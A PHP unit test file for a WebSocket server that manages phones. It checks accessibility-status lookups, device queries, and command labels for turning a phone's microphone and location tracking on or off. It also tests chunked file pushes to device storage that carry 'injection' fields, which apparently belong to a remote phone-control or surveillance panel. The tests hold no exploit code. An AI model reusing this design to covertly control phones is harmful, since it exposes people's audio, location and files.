<?php

declare(strict_types=1);

namespace Tests\Unit\WebSocket;

use App\Models\Device;
use App\WebSocket\ConnectionManager;
use App\WebSocket\Handlers\CheckPhoneHandler;
use App\WebSocket\Handlers\PanelHandler;
use App\WebSocket\Handlers\PanelSendHandler;
use App\WebSocket\Messages\WebSocketMessage;
use App\WebSocket\Server;
use App\WebSocket\Services\DatabaseReconnector;
use App\WebSocket\Services\DeviceStatusService;
use App\WebSocket\Services\PanelAuthService;
use App\WebSocket\Services\PanelNotificationService;
use Mockery;
use Tests\TestCase;

class HandlersAndServicesTest extends TestCase
{
    // ═══════════════════════════════════════════════════════════════
    // CheckPhoneHandler
    // ═══════════════════════════════════════════════════════════════

    private function makeCheckPhoneHandler(): CheckPhoneHandler
    {
        $cm = Mockery::mock(ConnectionManager::class);
        $auth = Mockery::mock(PanelAuthService::class);

        return new CheckPhoneHandler($cm, $auth);
    }

    public function test_check_phone_build_error_response_structure(): void
    {
        $handler = $this->makeCheckPhoneHandler();
        $result = $this->invokeOn($handler, 'buildErrorResponse', ['Token is required', 2, 20]);

        $this->assertEquals('checkphone', $result['type']);
        $this->assertEquals('Token is required', $result['error']);
        $this->assertEquals([], $result['list']);
        $this->assertEquals(0, $result['total']);
        $this->assertEquals(0, $result['pageCount']);
        $this->assertEquals(2, $result['page']);
        $this->assertEquals(20, $result['pageSize']);
    }

    public function test_check_phone_build_error_response_different_params(): void
    {
        $handler = $this->makeCheckPhoneHandler();
        $result = $this->invokeOn($handler, 'buildErrorResponse', ['Invalid or expired token', 5, 50]);

        $this->assertEquals('Invalid or expired token', $result['error']);
        $this->assertEquals(5, $result['page']);
        $this->assertEquals(50, $result['pageSize']);
    }

    public function test_check_phone_resolve_accessibility_memory_value_1(): void
    {
        $handler = $this->makeCheckPhoneHandler();

        $device = new Device;
        $device->has_accessibility = false;

        $result = $this->invokeOn($handler, 'resolveAccessibilityStatus', [
            ['has_accessibility' => '1'], $device,
        ]);

        $this->assertEquals('1', $result);
    }

    public function test_check_phone_resolve_accessibility_memory_value_0_falls_back_to_db(): void
    {
        $handler = $this->makeCheckPhoneHandler();

        $device = new Device;
        $device->has_accessibility = true;

        $result = $this->invokeOn($handler, 'resolveAccessibilityStatus', [
            ['has_accessibility' => '0'], $device,
        ]);

        // memory says '0', but since it's not '1', falls back to db value
        $this->assertEquals('1', $result);
    }

    public function test_check_phone_resolve_accessibility_no_memory_uses_db_true(): void
    {
        $handler = $this->makeCheckPhoneHandler();

        $device = new Device;
        $device->has_accessibility = true;

        $result = $this->invokeOn($handler, 'resolveAccessibilityStatus', [[], $device]);

        $this->assertEquals('1', $result);
    }

    public function test_check_phone_resolve_accessibility_no_memory_uses_db_false(): void
    {
        $handler = $this->makeCheckPhoneHandler();

        $device = new Device;
        $device->has_accessibility = false;

        $result = $this->invokeOn($handler, 'resolveAccessibilityStatus', [[], $device]);

        $this->assertEquals('0', $result);
    }

    public function test_check_phone_build_device_query_admin_no_user_filter(): void
    {
        $handler = $this->makeCheckPhoneHandler();
        $query = $this->invokeOn($handler, 'buildDeviceQuery', [true, 42]);

        $sql = $query->toRawSql();
        $this->assertStringContainsString('is_removed', $sql);
        $this->assertStringNotContainsString('user_id', $sql);
    }

    public function test_check_phone_build_device_query_non_admin_with_owner(): void
    {
        $handler = $this->makeCheckPhoneHandler();
        $query = $this->invokeOn($handler, 'buildDeviceQuery', [false, 42]);

        $sql = $query->toRawSql();
        $this->assertStringContainsString('user_id', $sql);
    }

    public function test_check_phone_build_device_query_non_admin_null_owner(): void
    {
        $handler = $this->makeCheckPhoneHandler();
        $query = $this->invokeOn($handler, 'buildDeviceQuery', [false, null]);

        $sql = $query->toRawSql();
        $this->assertStringContainsString('1 = 0', $sql);
    }

    // ═══════════════════════════════════════════════════════════════
    // PanelHandler
    // ═══════════════════════════════════════════════════════════════

    private function makePanelHandler(): PanelHandler
    {
        $cm = Mockery::mock(ConnectionManager::class);
        $dss = Mockery::mock(DeviceStatusService::class);

        return new PanelHandler($cm, $dss);
    }

    public function test_panel_handler_connection_status_label_online(): void
    {
        $handler = $this->makePanelHandler();
        $result = $this->invokeOn($handler, 'connectionStatusLabel', [true]);

        $this->assertEquals('OPEN', $result);
    }

    public function test_panel_handler_connection_status_label_offline(): void
    {
        $handler = $this->makePanelHandler();
        $result = $this->invokeOn($handler, 'connectionStatusLabel', [false]);

        $this->assertEquals('CLOSED', $result);
    }

    public function test_panel_handler_build_status_batch_payload_structure(): void
    {
        $cm = Mockery::mock(ConnectionManager::class);
        $dss = Mockery::mock(DeviceStatusService::class);

        $dss->shouldReceive('formatForPanel')->andReturn([
            'pid' => 'phone-1',
            'is_online' => true,
            'lastPing' => 1700000000000,
        ]);
        $cm->shouldReceive('isDeviceOnline')->andReturn(true);

        $handler = new PanelHandler($cm, $dss);
        $result = $this->invokeOn($handler, 'buildStatusBatchPayload', ['phone-1']);

        $this->assertEquals('statusBatch', $result['type']);
        $this->assertEquals('phone-1', $result['pid']);
        $this->assertEquals('OPEN', $result['serverToPhone']);
        $this->assertArrayHasKey('lastPing', $result);
        $this->assertArrayHasKey('phoneInfo', $result);
    }

    public function test_panel_handler_build_status_batch_payload_offline(): void
    {
        $cm = Mockery::mock(ConnectionManager::class);
        $dss = Mockery::mock(DeviceStatusService::class);

        $dss->shouldReceive('formatForPanel')->andReturn([
            'pid' => 'phone-2',
            'is_online' => false,
            'lastPing' => 0,
        ]);
        $cm->shouldReceive('isDeviceOnline')->andReturn(false);

        $handler = new PanelHandler($cm, $dss);
        $result = $this->invokeOn($handler, 'buildStatusBatchPayload', ['phone-2']);

        $this->assertEquals('CLOSED', $result['serverToPhone']);
    }

    // ═══════════════════════════════════════════════════════════════
    // PanelSendHandler
    // ═══════════════════════════════════════════════════════════════

    private function makePanelSendHandler(): PanelSendHandler
    {
        $cm = Mockery::mock(ConnectionManager::class);

        return new PanelSendHandler($cm);
    }

    public function test_microphone_command_label_mic(): void
    {
        $handler = $this->makePanelSendHandler();
        $this->assertEquals('ON', $this->invokeOn($handler, 'microphoneCommandLabel', ['mic']));
    }

    public function test_microphone_command_label_micoff(): void
    {
        $handler = $this->makePanelSendHandler();
        $this->assertEquals('OFF', $this->invokeOn($handler, 'microphoneCommandLabel', ['micoff']));
    }

    public function test_location_command_label_loc(): void
    {
        $handler = $this->makePanelSendHandler();
        $this->assertEquals('Location', $this->invokeOn($handler, 'locationCommandLabel', ['loc']));
    }

    public function test_location_command_label_locoff(): void
    {
        $handler = $this->makePanelSendHandler();
        $this->assertEquals('Locationoff', $this->invokeOn($handler, 'locationCommandLabel', ['locoff']));
    }

    public function test_build_file_chunk_payload_structure(): void
    {
        $handler = $this->makePanelSendHandler();
        $message = WebSocketMessage::fromArray([
            'comdtype' => 'U',
            'isinjct' => '0',
            'jctid' => 'j1',
            'filepath' => '/sdcard/test.txt',
            'filetype' => 'text',
            'filename' => 'test.txt',
            'size' => '1024',
        ]);

        $result = $this->invokeOn($handler, 'buildFileChunkPayload', [$message, 'chunk-data', 0, 3]);

        $this->assertEquals('screencomd', $result['type']);
        $this->assertEquals('changefiles', $result['subc']);
        $this->assertEquals('U', $result['comdtype']);
        $this->assertEquals('0', $result['isinjct']);
        $this->assertEquals('j1', $result['jctid']);
        $this->assertEquals('/sdcard/test.txt', $result['filepath']);
        $this->assertEquals('text', $result['filetype']);
        $this->assertEquals('test.txt', $result['filename']);
        $this->assertEquals('1024', $result['size']);
        $this->assertEquals(0, $result['chunkIndex']);
        $this->assertEquals(3, $result['totalChunks']);
        $this->assertEquals('chunk-data', $result['content']);
    }

    public function test_build_file_chunk_payload_last_chunk(): void
    {
        $handler = $this->makePanelSendHandler();
        $message = WebSocketMessage::fromArray([
            'comdtype' => 'U',
            'filepath' => '/test',
            'filetype' => 'bin',
            'filename' => 'a.bin',
            'size' => '512',
        ]);

        $result = $this->invokeOn($handler, 'buildFileChunkPayload', [$message, 'last', 4, 5]);

        $this->assertEquals(4, $result['chunkIndex']);
        $this->assertEquals(5, $result['totalChunks']);
        $this->assertEquals('last', $result['content']);
    }

    // ═══════════════════════════════════════════════════════════════
    // PanelNotificationService
    // ═══════════════════════════════════════════════════════════════

    private function makePanelNotificationService(): PanelNotificationService
    {
        $cm = Mockery::mock(ConnectionManager::class);
        $dr = Mockery::mock(DatabaseReconnector::class);

        return new PanelNotificationService($cm, $dr);
    }

    public function test_device_status_label_online(): void
    {
        $service = $this->makePanelNotificationService();
        $this->assertEquals('online', $this->invokeOn($service, 'deviceStatusLabel', [true]));
    }

    public function test_device_status_label_offline(): void
    {
        $service = $this->makePanelNotificationService();
        $this->assertEquals('offline', $this->invokeOn($service, 'deviceStatusLabel', [false]));
    }

    public function test_device_status_event_type_online(): void
    {
        $service = $this->makePanelNotificationService();
        $this->assertEquals('deviceOnline', $this->invokeOn($service, 'deviceStatusEventType', [true]));
    }

    public function test_device_status_event_type_offline(): void
    {
        $service = $this->makePanelNotificationService();
        $this->assertEquals('deviceOffline', $this->invokeOn($service, 'deviceStatusEventType', [false]));
    }

    public function test_build_device_update_payload(): void
    {
        $service = $this->makePanelNotificationService();
        $phoneInfo = ['pid' => 'p1', 'is_online' => true];

        $result = $this->invokeOn($service, 'buildDeviceUpdatePayload', ['p1', $phoneInfo, null]);

        $this->assertEquals('deviceUpdate', $result['type']);
        $this->assertEquals('p1', $result['pid']);
        $this->assertEquals($phoneInfo, $result['phoneInfo']);
        $this->assertArrayHasKey('stats', $result);
    }

    public function test_build_status_change_payload_online(): void
    {
        $service = $this->makePanelNotificationService();
        $phoneInfo = ['pid' => 'p1', 'battery' => '80'];

        $result = $this->invokeOn($service, 'buildStatusChangePayload', ['p1', $phoneInfo, true, null]);

        $this->assertEquals('deviceOnline', $result['type']);
        $this->assertEquals('p1', $result['pid']);
        $this->assertEquals($phoneInfo, $result['phoneInfo']);
        $this->assertArrayHasKey('stats', $result);
    }

    public function test_build_status_change_payload_offline_nulls_phone_info(): void
    {
        $service = $this->makePanelNotificationService();
        $phoneInfo = ['pid' => 'p1'];

        $result = $this->invokeOn($service, 'buildStatusChangePayload', ['p1', $phoneInfo, false, null]);

        $this->assertEquals('deviceOffline', $result['type']);
        $this->assertNull($result['phoneInfo']);
    }

    // ═══════════════════════════════════════════════════════════════
    // Server — DATABASE_CONNECTION_ERRORS constant
    // ═══════════════════════════════════════════════════════════════

    public function test_database_connection_errors_constant_exists(): void
    {
        $ref = new \ReflectionClass(Server::class);
        $this->assertTrue($ref->hasConstant('DATABASE_CONNECTION_ERRORS'));

        $constant = $ref->getConstant('DATABASE_CONNECTION_ERRORS');
        $this->assertIsArray($constant);
        $this->assertNotEmpty($constant);
        $this->assertContains('server has gone away', $constant);
        $this->assertContains('SQLSTATE[HY000] [2002]', $constant);
        $this->assertContains('SQLSTATE[HY000] [2006]', $constant);
        $this->assertContains('Connection refused', $constant);
    }

    // ═══════════════════════════════════════════════════════════════
    // Helper
    // ═══════════════════════════════════════════════════════════════

    private function invokeOn(object $instance, string $method, array $args): mixed
    {
        $ref = new \ReflectionMethod($instance, $method);

        return $ref->invoke($instance, ...$args);
    }
}
